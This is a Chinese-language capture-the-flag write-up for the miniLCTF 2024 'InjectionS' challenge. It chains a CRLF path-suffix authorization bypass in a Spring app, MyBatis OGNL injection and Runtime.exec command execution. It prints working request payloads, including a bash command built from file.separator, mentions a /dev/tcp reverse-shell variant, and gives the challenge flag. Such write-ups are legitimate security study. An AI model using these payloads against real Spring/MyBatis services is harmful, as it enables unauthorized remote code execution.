# miniLCTF 2024 InjectionS Writeup

## 题目简述

Spring 应用的 `/admin/{id}` 正常需要权限，路径末尾加入 CRLF 编码可绕过检查。`id` 随后进入 MyBatis 的 OGNL 表达式解析，攻击者能够调用任意 Java 静态方法。利用中还要处理两个表示层问题：斜杠会被 HTTP 路由当作路径分隔符，`Runtime.exec(String)` 会按自身规则切分命令字符串。

## 解题过程

### 绕过权限并确认 OGNL

原请求：

```text
GET /admin/1
```

在路径末尾追加 `%0d%0a` 后通过权限检查：

```text
GET /admin/1%0d%0a
```

用无副作用表达式验证 OGNL：

```text
/admin/${@java.lang.Math@max(1,2+1)}%0d%0a
```

若返回与 `/admin/3` 相同，说明 `${...}` 已被求值，而不是普通字符串。

### 处理路径斜杠与命令分词

直接在 URL 中写 `/bin/bash` 会被路由拆段。可以用

```java
@java.lang.System@getProperty("file.separator")
```

在服务端取得 `/`，再用 `.concat(...)` 拼出路径。与此同时，`Runtime.exec(String)` 不理解 shell 引号；需要显式执行 `/bin/bash -c <command>`，并让第三个参数本身不含普通空格，例如用 `$IFS$9` 替代。

下面是结构化后的命令执行表达式，实际发送前需对空格、`>`、`<` 等字符做 URL 编码：

```text
${@java.lang.Runtime@getRuntime().exec(
  @java.lang.System@getProperty("file.separator").concat("bin")
  .concat(@java.lang.System@getProperty("file.separator")).concat("bash")
  .concat(" -c echo$IFS$9$FLAG")
)}%0d%0a
```

若目标不出网，不应执着于反弹 shell。可把命令输出写到已知静态资源目录，再用 HTTP 取回；也可使用适配当前 Tomcat/Spring 版本的命令回显。原题解展示的完整反弹 shell payload，本质同样是以 `file.separator` 拼接 `/bin/bash` 和 `/dev/tcp/...`。

仓库部署文件中的 flag 为：

```text
miniLCTF{0h_mYG0000dness_You_F1nally_Mybatis2OGNL_And_RCE_The_Server!!!!}
```

## 方法总结

该链包含“CRLF 路径规范化差异 → MyBatis OGNL 注入 → Java 命令执行”三层。构造 Java RCE 时，HTTP 路由语义和 `Runtime.exec` 分词语义同样重要；把表达式写对但忽略斜杠或空格，仍会在到达危险调用前失败。
